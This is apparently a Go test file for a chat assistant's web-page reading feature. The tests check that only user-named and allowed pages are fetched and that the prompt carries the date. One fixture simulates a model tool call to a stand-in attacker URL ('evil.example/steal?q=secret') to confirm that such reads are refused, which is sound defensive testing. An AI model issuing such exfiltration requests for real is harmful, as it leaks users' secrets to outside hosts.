package chatrun

import (
	"context"
	"encoding/json"
	"reflect"
	"strings"
	"sync"
	"testing"

	"github.com/aafnx/omnibox-ai/internal/config"
	"github.com/aafnx/omnibox-ai/internal/websearch"
)

func pageReader(read *[]string, mu *sync.Mutex) func(ctx context.Context, url string) (websearch.Page, error) {
	return func(ctx context.Context, url string) (websearch.Page, error) {
		mu.Lock()
		*read = append(*read, url)
		mu.Unlock()
		return websearch.Page{URL: url, Title: "Страница " + websearch.Host(url), Text: "Полный текст: включите WoL в BIOS."}, nil
	}
}

// With web search on, the page the user named and the best result are read in full; the model
// may open another result, but nothing else.
func TestPagesAreReadInFull(t *testing.T) {
	g := newRig(t)
	var read []string
	var mu sync.Mutex
	g.r.Read = pageReader(&read, &mu)
	call := func(url string) string {
		args, _ := json.Marshal(map[string]string{"url": url})
		return `{"choices":[{"delta":{"tool_calls":[{"index":0,"id":"c1","function":{"name":"read_page","arguments":` + strconvQuote(string(args)) + `}}]}}]}`
	}
	g.replies = []string{
		sse(call("https://evil.example/steal?q=secret")),
		sse(call("https://www.home-assistant.io/wol")),
		sse(`{"choices":[{"delta":{"content":"Включите WoL в BIOS [2]."}}]}`),
	}
	code, ev := g.send(Request{ChatID: g.chat.ID, Model: local.Key, Text: "Как включить WoL? См. https://example.com/guide, и не http://192.168.1.1/", Web: true, Effort: "off"})
	if code != 200 || len(ev["done"]) != 1 {
		t.Fatalf("%d %v", code, ev)
	}
	mu.Lock()
	got := append([]string{}, read...)
	mu.Unlock()
	if !reflect.DeepEqual(got, []string{"https://example.com/guide", "https://www.home-assistant.io/wol"}) {
		t.Fatalf("read %v", got)
	}
	first := g.bodies[0]
	sys := first["messages"].([]any)[0].(map[string]any)["content"].(string)
	// The model is told the date with the weekday, so "today" in the question is not a guess.
	if !strings.HasPrefix(sys, "Сейчас ") || !strings.Contains(sys, "дата в формате ISO") {
		t.Fatalf("no date: %s", sys[:min(len(sys), 200)])
	}
	if !strings.Contains(sys, "Текст страниц") || !strings.Contains(sys, "[1] Страница example.com — https://example.com/guide") || !strings.Contains(sys, "[2] Страница home-assistant.io") {
		t.Fatalf("system prompt: %s", sys)
	}
	if tools := first["tools"].([]any); len(tools) != 2 {
		t.Fatalf("tools: %v", tools)
	}
	// The model's own reads: a foreign address is refused, a page already read is not read again.
	toolMsgs := g.bodies[2]["messages"].([]any)
	var answers []string
	for _, m := range toolMsgs {
		if mm := m.(map[string]any); mm["role"] == "tool" {
			answers = append(answers, mm["content"].(string))
		}
	}
	if len(answers) != 2 || !strings.Contains(answers[0], "прочитать нельзя") || !strings.Contains(answers[1], "уже прочитана") {
		t.Fatalf("tool answers: %v", answers)
	}
	c, _ := g.r.Chats.Get(g.chat.ID)
	if meta := c.Messages[1].Meta; len(meta.Pages) != 2 || len(meta.Sources) != 2 {
		t.Fatalf("meta: %+v", meta)
	}
	if len(ev["read"]) != 2 {
		t.Fatalf("read events: %v", ev["read"])
	}
}

func TestPagesAreNotReadWhenOff(t *testing.T) {
	g := newRig(t)
	var read []string
	var mu sync.Mutex
	g.r.Read = pageReader(&read, &mu)
	g.r.Config = func() *config.Config {
		c := config.Default()
		s := config.DefaultChat()
		s.NoSearchPlan = true
		s.NoReadPages = true
		c.Chat = &s
		return c
	}
	g.replies = []string{sse(`{"choices":[{"delta":{"content":"Ответ"}}]}`)}
	if code, _ := g.send(Request{ChatID: g.chat.ID, Model: local.Key, Text: "Как включить WoL? https://example.com/guide", Web: true, Effort: "off"}); code != 200 {
		t.Fatal(code)
	}
	if len(read) != 0 || len(g.bodies[0]["tools"].([]any)) != 1 {
		t.Fatalf("read %v, tools %v", read, g.bodies[0]["tools"])
	}
}

func TestLinksIn(t *testing.T) {
	got := linksIn("см. https://a.example/x, (https://b.example/y) и http://localhost:8800 и «https://c.example»", 5)
	if !reflect.DeepEqual(got, []string{"https://a.example/x", "https://b.example/y", "https://c.example"}) {
		t.Fatal(got)
	}
}

func strconvQuote(s string) string { b, _ := json.Marshal(s); return string(b) }
